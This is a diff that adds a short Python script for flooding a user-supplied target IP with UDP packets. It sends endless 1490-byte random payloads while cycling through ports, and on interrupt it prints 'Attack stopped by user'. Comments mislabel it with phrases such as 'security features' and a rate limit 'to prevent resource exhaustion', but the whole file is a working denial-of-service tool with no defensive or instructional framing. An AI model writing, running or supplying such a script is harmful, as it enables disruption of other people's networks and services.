@@ -1,0 +1,58 @@
+05.16 10:28 PM
+import sys
+import os
+import time
+import socket
+import secrets
+from datetime import datetime
+
+# Code Time
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+# Create a UDP socket with security features
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
+# Get target IP address and port number from user
+while True:
+    ip = input("Enter target IP address: ")
+    if ip:
+        break
+    else:
+        print("Invalid input. Please enter a valid IP address.")
+
+while True:
+    try:
+        port = int(input("Enter target port number: "))
+        if 0 <= port <= 65535:
+            break
+        else:
+            print("Invalid input. Please enter a valid port number between 0 and 65535.")
+    except ValueError:
+        print("Invalid input. Please enter a valid port number.")
+
+# Set rate limit to prevent resource exhaustion
+rate_limit = 100  # packets per second
+
+# Send packets to target IP address
+sent = 0
+while True:
+    try:
+        # Generate random bytes using secure random number generator
+        bytes = secrets.token_bytes(1490)
+        sock.sendto(bytes, (ip, port))
+        sent += 1
+        port = (port + 1) % 65536  # increment port number and wrap around to 0 if necessary
+        print(f"Sent {sent} packet to {ip} through port {port}")
+        time.sleep(1 / rate_limit)  # wait for rate limit
+    except socket.error as e:
+        print(f"Socket error: {e}")
+        break
+    except KeyboardInterrupt:
+        print("Attack stopped by user.")
+        break
